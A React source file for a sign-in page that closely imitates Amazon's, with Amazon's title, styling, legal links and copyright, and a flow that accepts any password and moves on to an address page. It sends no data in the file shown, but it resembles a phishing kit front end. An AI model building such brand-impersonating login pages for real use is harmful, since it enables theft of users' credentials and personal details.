import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

import Loading from "../assets/loading.gif";

import LoginError from "../components/LoginError";
import Header from "../components/Header";

const Login = () => {
  // title
  document.title = "Amazon Sign-In";

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleContinue = () => {
    if (email.length > 0) {
      setShowPassword(true);
    }
  };

  const handleSignin = () => {
    if (password.length > 3) {
      setTimeout(() => {
        setLoading(true);
      }, 5000)
      setLoading(false);
      navigate("/address");
    }
    setShowError(true);
    setPassword("");
  };

  return (
    <>
      <Header />

      {showError && <LoginError />}

      <div className="w-[23%] mx-auto mt-2 border rounded-[4px] border-[#dad4d4] font-amazonMain px-6 py-4">
        <p className="text-black text-[28px] w-fit my-5">Sign in</p>

        {showPassword && (
          <div className="flex items-center space-x-2 my-2 text-[13px] leading-[19px]">
            <span className="text-[#111]">{email}</span>
            <p
              className="text-blue-700 hover:text-orange-500 hover:cursor-pointer hover:underline"
              onClick={() => setShowPassword(false)}
            >
              Change
            </p>
          </div>
        )}

        {!showPassword ? (
          <div className="flex flex-col w-full">
            <label htmlFor="email" className="text-black font-bold text-[13px]">
              Email or mobile phone number
            </label>

            <input
              type="text"
              id="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-[#111] focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
            />
          </div>
        ) : (
          <div className="mt-5 flex flex-col w-full">
            <div className="flex items-center justify-between w-full">
              <label
                htmlFor="password"
                className="text-black font-bold text-[13px]"
              >
                Password
              </label>

              <a
                href="#"
                className="text-[13px] hover:underline hover:text-orange-500"
              >
                Forgot your password?
              </a>
            </div>

            <input
              type="password"
              id="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-[#111] focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
            />
          </div>
        )}

        <div className="w-full">
          <button
            className="text-[#111] leading-[29px] outline-none border-none bg-gradient-to-b from-[#f7dfa5] to-[#f0c14b] rounded-[2px] h-[29px] w-full mt-2 text-[13px] flex justify-center items-center hover:from-[#f5d78e] hover:to-[#eeb933]"
            onClick={showPassword ? handleSignin : handleContinue}
          >
            {showPassword ? "Sign in" : "Continue"}
          </button>
        </div>

        <div className="mt-5">
          <p className="text-[12px] leading-[1.5] text-[#111]">
            {" "}
            By continuing, you agree to Amazon's{" "}
            <span>
              <a href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&nodeId=508088">
                Conditions of Use
              </a>
            </span>{" "}
            and{" "}
            <span>
              <a href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&nodeId=468496">
                {" "}
                Privacy Notice{" "}
              </a>
            </span>{" "}
            .
          </p>
        </div>
      </div>

      {!showPassword && (
        <>
          <div className="w-[23%] mx-auto text-center relative top-[2px] pt-[1px] mb-[14px] after:content-none after:bg-transparent after:block after:h-[1px] after:border-t-2 after:border-[#e7e7e7] after:absolute after:top-1/2 after:mt-[-1px] after:z-[1]">
            <h5 className="leading-[1] text-[12px] text-[#767676] font-[400] z-[2] relative inline-block bg-[#fff] my-4">
              New to Amazon?
            </h5>
          </div>

          <div className="w-full flex justify-center">
            <div
              className="w-[23%] mx-auto bg-[#e7e9ec] rounded-[3px] border cursor-pointer inline-block text-center"
              style={{ borderColor: "#adb1b8 #a2a6ac #8d9096" }}
            >
              <span
                className="w-full bg-gradient-to-b from-[#f7f8fa] to-[#e7e9ec] block relative overflow-hidden h-[29px] rounded-[2px] hover:from-[#e7eaf0] hover:to-[#d9dce1]"
                style={{ boxShadow: "0 1px 0 rgba(255,255,255,.6) inset" }}
              >
                <button
                  className="leading-[29px] text-[#111] w-full h-full bg-transparent border-none block text-[13px] m-0 outline-none text-center whitespace-nowrap font-normal"
                  style={{ padding: "0 10px 0 11px" }}
                >
                  Create your Amazon account
                </button>
              </span>
            </div>
          </div>
        </>
      )}

      <div className="mt-[30px] w-[20%] mx-auto">
        <div className="flex justify-evenly items-center w-full text-[11px] !leading-[1.465]">
          <a
            href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&nodeId=508088"
            className="text-blue-800"
          >
            Conditions of Use
          </a>

          <a
            href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&nodeId=468496"
            className="text-blue-800"
          >
            Privacy Notice
          </a>

          <a
            href="https://www.amazon.com/gp/help/customer/display.html"
            className="text-blue-800"
          >
            Help
          </a>
        </div>

        <div className="mt-2 w-full text-center">
          <span className="text-[#555] text-[11px] leading-[1.465] text-center">
            © 1996-2023, Amazon.com, Inc. or its affiliates
          </span>
        </div>
      </div>
    </>
  );
};

export default Login;
